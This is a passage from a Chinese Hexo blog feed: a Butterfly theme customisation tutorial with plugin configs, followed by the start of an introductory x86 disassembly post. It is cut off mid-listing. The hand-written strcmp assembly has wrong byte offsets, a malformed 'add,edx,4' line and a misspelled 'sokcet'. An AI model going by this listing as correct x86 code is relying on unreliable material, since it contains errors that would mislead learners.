class="string">&#x27;data-theme&#x27;</span>) == <span class="string">&#x27;dark&#x27;</span> &amp;&amp; <span class="title function_">u</span>(),</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(t)</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line">;<span class="title function_">dark</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="pug文件修改"><a href="#pug文件修改" class="headerlink" title="pug文件修改"></a>pug文件修改</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>去除搜索二字</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blog\themes\Butterfly\layout\includes\header\nav.pug</span></span><br><span class="line"></span><br><span class="line">对下列语句进行注释：<span class="comment">// span=&#x27; &#x27;+_p(&#x27;search.title&#x27;)</span></span><br></pre></td></tr></table></figure></li><li><p>直达顶部和底部</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blog\themes\butterfly\layout\includes\rightside.pug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*在</span></span><br><span class="line"><span class="comment">if showArray</span></span><br><span class="line"><span class="comment">    +rightsideItem(showArray)</span></span><br><span class="line"><span class="comment">加上如下代码：（首缩进同if）*/</span></span><br><span class="line"><span class="comment">// 顶部百分比</span></span><br><span class="line">button#go-<span class="title function_">up</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="title function_">_p</span>(<span class="string">&quot;rightside.back_to_top&quot;</span>))</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-up</span><br><span class="line">  span#percent <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直达底部</span></span><br><span class="line">button#go-<span class="title function_">up</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="title function_">_p</span>(<span class="string">&quot;rightside.back_to_top&quot;</span>))</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-up</span><br><span class="line"><span class="comment">// 上述代码替换如下代码</span></span><br><span class="line">button#go-<span class="title function_">down</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="string">&quot;直达底部&quot;</span> onclick=<span class="string">&quot;btf.scrollToDest(document.body.scrollHeight, 500)&quot;</span>)</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-down</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><hr><h2 id="二、复杂插件配置"><a href="#二、复杂插件配置" class="headerlink" title="二、复杂插件配置"></a>二、复杂插件配置</h2><h3 id="评论信箱"><a href="#评论信箱" class="headerlink" title="评论信箱"></a>评论信箱</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/e2d3c450/">author::信笺样式留言板</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-envelope --save -g</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信箱评论</span></span><br><span class="line"><span class="comment"># envelope_comment</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/e2d3c450/</span></span><br><span class="line"><span class="attr">envelope_comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制开关</span></span><br><span class="line">  <span class="attr">custom_pic:</span>      </span><br><span class="line">    <span class="attr">cover:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/violet.jpg</span> <span class="comment">#信笺头部图片</span></span><br><span class="line">    <span class="attr">line:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/line.png</span> <span class="comment">#信笺底部图片</span></span><br><span class="line">    <span class="attr">beforeimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/before.png</span> <span class="comment"># 信封前半部分</span></span><br><span class="line">    <span class="attr">afterimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/after.png</span> <span class="comment"># 信封后半部分</span></span><br><span class="line">  <span class="attr">message:</span> <span class="comment">#信笺正文，多行文本，写法如下</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想问的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想说的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想吐槽的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哪怕是有什么想吃的，都可以告诉我哦~</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="string">自动书记人偶竭诚为您服务！</span> <span class="comment">#仅支持单行文本</span></span><br><span class="line">  <span class="attr">height:</span> <span class="comment">#1050px，信封划出的高度</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】comments 的路径名称。默认为 comments，生成的页面为 comments/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】comments页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">留言板</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="页脚徽标"><a href="#页脚徽标" class="headerlink" title="页脚徽标"></a>页脚徽标</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/e2d3c450/">author::Add Github Badge</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-footer-beautify --save -g</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 页脚内容</span></span><br><span class="line"><span class="comment"># footer_beautify</span></span><br><span class="line"><span class="comment"># 页脚计时器：[Native JS Timer](https://akilar.top/posts/b941af/)</span></span><br><span class="line"><span class="comment"># 页脚徽标：[Add Github Badge](https://akilar.top/posts/e87ad7f8/)</span></span><br><span class="line"><span class="attr">footer_beautify:</span></span><br><span class="line">  <span class="attr">enable:</span></span><br><span class="line">    <span class="attr">timer:</span> <span class="literal">true</span> <span class="comment"># 计时器开关</span></span><br><span class="line">    <span class="attr">bdage:</span> <span class="literal">true</span> <span class="comment"># 徽标开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="comment">#屏蔽页面</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">footer-wrap</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># 计时器部分配置项（看你喜欢哪个，最好下载下来放到自己的项目中不然会增加我网站的负载）</span></span><br><span class="line">  <span class="comment"># 这是我的  </span></span><br><span class="line">  <span class="comment"># runtime_js: https://www.fomal.cc/static/js/runtime.js</span></span><br><span class="line">  <span class="comment"># runtime_css: https://www.fomal.cc/static/css/runtime.min.css </span></span><br><span class="line">  <span class="comment"># 这是店长的 </span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">/js/runtime.js</span></span><br><span class="line">  <span class="attr">runtime_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css</span></span><br><span class="line">  <span class="comment"># 徽标部分配置项</span></span><br><span class="line">  <span class="attr">swiperpara:</span> <span class="number">0</span> <span class="comment">#若非0，则开启轮播功能，每行徽标个数</span></span><br><span class="line">  <span class="attr">bdageitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://hexo.io/</span> <span class="comment">#徽标指向网站链接</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo</span> <span class="comment">#徽标API</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">博客框架为Hexo_v6.2.0</span> <span class="comment">#徽标提示语</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://butterfly.js.org/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">主题版本Butterfly_v4.3.1</span></span><br><span class="line">    <span class="comment"># - link: https://vercel.com/</span></span><br><span class="line">    <span class="comment">#   shields: https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel</span></span><br><span class="line">    <span class="comment">#   message: 本站采用多线部署，主线路托管于Vercel</span></span><br><span class="line">    <span class="comment"># - link: https://dashboard.4everland.org/</span></span><br><span class="line">    <span class="comment"># # https://img.shields.io/badge/Hosted-4EVERLAND-3FE2C1?style=flat&amp;logo=IPFS</span></span><br><span class="line">    <span class="comment">#   shields: https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS</span></span><br><span class="line">    <span class="comment">#   message: 本站采用多线部署，备用线路托管于4EVERLAND</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://github.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站项目由Github托管</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">http://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js</span></span><br><span class="line">  <span class="attr">swiperbdage_init_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-footer-beautify/lib/swiperbdage_init.min.js</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="首页分类磁贴"><a href="#首页分类磁贴" class="headerlink" title="首页分类磁贴"></a>首页分类磁贴</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/a9131002/">author::Categories Magnet</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-categories-card --save -g</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分类栏</span></span><br><span class="line"><span class="comment"># hexo-butterfly-categories-card</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/a9131002/</span></span><br><span class="line"><span class="attr">categoryBar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">column:</span> <span class="string">odd</span> <span class="comment"># odd：3列 | even：4列</span></span><br><span class="line">  <span class="attr">row:</span> <span class="number">1</span> <span class="comment">#显示行数，默认两行，超过行数切换为滚动显示</span></span><br><span class="line">  <span class="attr">message:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> <span class="string">编程语言知识</span> <span class="comment"># 编程语言</span></span><br><span class="line">      <span class="attr">cover:</span> <span class="string">/img/default_cover_1.png</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="首页轮播栏"><a href="#首页轮播栏" class="headerlink" title="首页轮播栏"></a>首页轮播栏</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/8e1264d1/">author::Swiper Bar</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-swiper --save -g</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首页轮播栏</span></span><br><span class="line"><span class="comment"># hexo-butterfly-swiper</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/8e1264d1/</span></span><br><span class="line"><span class="attr">swiper:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">7</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">timemode:</span> <span class="string">update</span> <span class="comment">#date/updated</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">default_descr:</span> <span class="string">再怎么看我也不知道怎么描述它的啦！</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css</span> <span class="comment">#swiper css依赖</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js</span> <span class="comment">#swiper js依赖</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css</span> <span class="comment"># 适配主题样式补丁</span></span><br><span class="line">  <span class="attr">custom_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js</span> <span class="comment"># swiper初始化方法</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="文章双栏显示"><a href="#文章双栏显示" class="headerlink" title="文章双栏显示"></a>文章双栏显示</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>在blog下运行<code>npm i hexo-butterfly-article-double-row --save -g</code></p></li><li><p>在hexo的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章双栏显示</span></span><br><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>翻页按钮可能存在bug，在custom.css中加上</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*底部页面选项栏*/</span></span><br><span class="line"><span class="comment">/* 翻页按钮居中 */</span></span><br><span class="line"><span class="selector-id">#pagination</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="wowjs动画"><a href="#wowjs动画" class="headerlink" title="wowjs动画"></a>wowjs动画</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/abab51cf/">author::Add Blog Animation</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-wowjs --save -g</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 出场动画</span></span><br><span class="line"><span class="attr">wowjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制动画开关。true是打开，false是关闭</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">10</span> <span class="comment">#过滤器优先级</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment">#移动端是否启用，默认移动端禁用</span></span><br><span class="line">  <span class="attr">animateitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">recent-post-item</span> <span class="comment">#必填项，需要添加动画的元素的class，文章卡片</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__fadeIn</span> <span class="comment">#必填项，需要添加的动画</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">2s</span> <span class="comment">#选填项，动画持续时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="comment"># delay: 0s #选填项，动画开始的延迟时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">100</span> <span class="comment">#选填项，开始动画的距离（相对浏览器底部）</span></span><br><span class="line">      <span class="comment"># iteration: 1 #选填项，动画重复的次数</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">card-widget</span> <span class="comment"># 侧边栏</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__fadeInRight</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="number">1.</span><span class="string">25s</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">animate_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css</span></span><br><span class="line">  <span class="attr">wow_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js</span></span><br><span class="line">  <span class="attr">wow_init_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="MD外挂标签"><a href="#MD外挂标签" class="headerlink" title="MD外挂标签"></a>MD外挂标签</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/615e2dec/">author::Tag Plugins Plus</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-tag-plugins-plus --save -g</code></p></li><li><p>hexo自带的插件可能兼容性差，用<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a>替换：</p><ul><li><code>npm uninstall hexo-renderer-marked --save -g</code> </li><li><code>npm install hexo-renderer-kramed --save -g</code></li></ul></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tag-plugins-plus</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/615e2dec/</span></span><br><span class="line"><span class="attr">tag_plugins:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">issues:</span> <span class="literal">false</span> <span class="comment">#issues标签依赖注入开关</span></span><br><span class="line">  <span class="attr">link:</span></span><br><span class="line">    <span class="attr">placeholder:</span> <span class="string">/img/link.png</span> <span class="comment">#link_card标签默认的图标图片</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br><span class="line">    <span class="attr">anima:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css</span> <span class="comment">#动画标签anima的依赖</span></span><br><span class="line">    <span class="attr">jquery:</span> <span class="string">https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">issues:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/issues.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">iconfont:</span> <span class="string">//at.alicdn.com/t/font_2032782_8d5kxvn09md.js</span> <span class="comment">#参看https://akilar.top/posts/d2ebecef/</span></span><br><span class="line">    <span class="attr">carousel:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js</span></span><br><span class="line">    <span class="attr">tag_plugins_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css</span></span><br></pre></td></tr></table></figure></li></ol><p>网站常用外挂标签如下</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">// 链接</span><br><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 时间轴</span><br><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 折叠框（参数1:blue,cyan等，参数2:open）</span><br><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 分栏</span><br><span class="line">&#123;% tabs Unique name %&#125;</span><br><span class="line">&lt;!--tab name--&gt;</span><br><span class="line">内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&lt;!--tab name--&gt;</span><br><span class="line">内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表格中用：&amp;#124; 代替 |</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="图片渲染"><a href="#图片渲染" class="headerlink" title="图片渲染"></a>图片渲染</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>安装<code>npm install hexo-asset-image -- save -g</code></p></li><li><p>在hexo配置文件中配置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 45行</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>引用图片时用<code>page_name/img_name.jpg</code>，其中page_name为文章所处文件夹下的一个与文章同名的文件夹。</p></li></ol>              </div>            </details><h3 id="永久链接"><a href="#永久链接" class="headerlink" title="永久链接"></a>永久链接</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://zhuanlan.zhihu.com/p/169492685">author::Hexo-abbrlink插件生成永久固定链接</a></p><ol><li><p>安装<code>npm install hexo-abbrlink --save</code></p></li><li><p>在hexo配置文件中设置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span>  <span class="comment"># 此处可以自己设置，也可以直接使用 :/abbrlink</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">    <span class="attr">alg:</span> <span class="string">crc32</span>   <span class="comment">#算法： crc16(default) and crc32</span></span><br><span class="line">    <span class="attr">rep:</span> <span class="string">hex</span>     <span class="comment">#进制： dec(default) and hex</span></span><br><span class="line"></span><br><span class="line"><span class="string">//</span> <span class="string">下面是不同配置的效果</span></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://test.com/posts/55c6.html</span></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://test.com/posts/43212.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://test.com/posts/6ec16a2c.html</span></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://test.com/posts/1521457752.html</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h2 id="三、上传github"><a href="#三、上传github" class="headerlink" title="三、上传github"></a>三、上传github</h2>]]></content>
      
      
      <categories>
          
          <category> 日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反汇编代码分析</title>
      <link href="/posts/f62ba5bb.html"/>
      <url>/posts/f62ba5bb.html</url>
      
        <content type="html"><![CDATA[<h1 id="反汇编代码分析"><a href="#反汇编代码分析" class="headerlink" title="反汇编代码分析"></a>反汇编代码分析</h1><blockquote><p><a href=".\b81b1ca5">text::masm32汇编</a></p><p><a href=".\68e517a">text::逆向工具</a></p></blockquote><hr><h2 id="一、函数分析"><a href="#一、函数分析" class="headerlink" title="一、函数分析"></a>一、函数分析</h2><h3 id="1-系统函数"><a href="#1-系统函数" class="headerlink" title="1 系统函数"></a>1 系统函数</h3><blockquote><p>系统函数是库中自带的函数，相关程序如OD可以将其直接分析出来。</p><p>下面仅举出一些例子，实际系统函数有很多。</p><p>系统函数关闭优化：优化——启动内部函数——否。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相关系统函数</span></span><br><span class="line"><span class="comment">// 图形显示函数</span></span><br><span class="line"><span class="built_in">MessageBoxA</span>(); <span class="comment">//ASCII码版本</span></span><br><span class="line"><span class="built_in">MessageBoxW</span>(); <span class="comment">//Unicode版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="built_in">printf</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络函数</span></span><br><span class="line"><span class="built_in">sokcet</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;strcmp(a,b)</span><br><span class="line">;取a,b前四位的地址</span><br><span class="line">mov edx,dword ptr [esp+4]</span><br><span class="line">mov ecx,dword ptr [esp+8]</span><br><span class="line">;检测最后两位是否为00，保证4字节对齐</span><br><span class="line">test edx,00000003</span><br><span class="line">jnz alignment</span><br><span class="line">start:</span><br><span class="line">    ;比较第一位</span><br><span class="line">    mov eax,dword ptr [edx]</span><br><span class="line">    cmp al,byte ptr [ecx]</span><br><span class="line">    jne false</span><br><span class="line">    ;判断是否是&#x27;\0&#x27;</span><br><span class="line">    or al,al</span><br><span class="line">    jz end</span><br><span class="line">    ;比较第二位</span><br><span class="line">    cmp ah,byte ptr [ecx+1]</span><br><span class="line">    jne false</span><br><span class="line">    or ah,ah</span><br><span class="line">    jz end</span><br><span class="line">    ;右移位，继续比较</span><br><span class="line">    shr eax,10</span><br><span class="line">    cmp al,byte ptr [ecx+3]</span><br><span class="line">    jne false</span><br><span class="line">    or al,al</span><br><span class="line">    jz end</span><br><span class="line">    cmp ah,byte ptr [ecx+4]</span><br><span class="line">    jne false</span><br><span class="line">    or ah,ah</span><br><span class="line">    jz end</span><br><span class="line">    ;比较接下来四个字符</span><br><span class="line">    add ecx,4</span><br><span class="line">    add,edx,4</span><br><span class="line">    ;判断结尾，没有结尾继续回到上面重复比较</span><br><span class="line">    or ah,ah</span><br><span class="line">jnz start</span><br></pre></td></tr></table></figure><h3 id="2-用户函数"><a href="#2-用户函数" class="headerlink" title="2 用户函数"></a>2 用户函数</h3><blockquote><p>用户自己编写的函数。</p><p>call会入栈EIP一次，retn会出栈一次，所以一段栈中的存储大致如下：<br>【栈顶】局部变量 | 上一函数EBP | 上一函数的EIP 【栈底】</p><p>所以一般而言：</p><p>[EBP - ?? ]：本函数的局部变量<br>[EBP + ??]：上一函数的局部变量</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;空函数必做的事 void fun()&#123;&#125;</span><br><span class="line">push ebp ;保存上一函数的栈底，同时esp会增加，esp此时指向了当前函数的栈底。</span><br><span class="line">mov ebp,esp ;把esp给ebp，让ebp做栈底，之后操作改变的偶数esp的值。</span><br><span class="line">pop ebp ;出栈，获得上一函数栈底，esp此时指向的应该是上一函数栈顶。</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">;分配空间 void fun()&#123;int a=3,b=5; char c=1;&#125;</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0C ;局部变量存在栈，开辟空间，会4对齐，所以是0x0C</span><br><span class="line">mov dword ptr [local.1],3</span><br><span class="line">mov dword ptr [local.2],5</span><br><span class="line">mov byte ptr [lcoal.3+3],1</span><br><span class="line">mov esp,ebp ;复原基址，返回上一函数</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">;参数传递 </span><br><span class="line">;void main()&#123; printf(add(3,6)); &#125;</span><br><span class="line">;int add(int a,int b)&#123; return a+b; &#125;</span><br><span class="line">;主函数</span><br><span class="line">push 6 ;传参，逆向入栈，便于正向出栈</span><br><span class="line">push 3</span><br><span class="line">call add</span><br><span class="line">add esp,8 ;恢复栈，保持栈平衡</span><br><span class="line">;add函数</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">mov eax,dword ptr 